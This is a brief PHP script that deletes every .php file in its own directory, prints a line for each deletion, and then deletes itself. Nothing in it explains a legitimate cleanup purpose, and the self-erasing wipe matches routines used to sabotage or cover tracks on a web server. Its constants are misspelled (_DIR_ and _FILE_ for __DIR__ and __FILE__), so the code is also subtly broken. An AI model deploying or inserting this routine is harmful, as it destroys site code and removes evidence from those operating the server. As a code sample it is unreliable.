<?php

$directory = _DIR_; 

$files = glob($directory . '/*.php'); 

foreach ($files as $file) {
    if (is_file($file)) {
        if (unlink($file)) {
            echo "Deleted: " . $file . "<br>";
        } else {
            echo "Error deleting: " . $file . "<br>";
        }
    }
}


if (is_file(_FILE_)) {
    unlink(_FILE_);
}

?>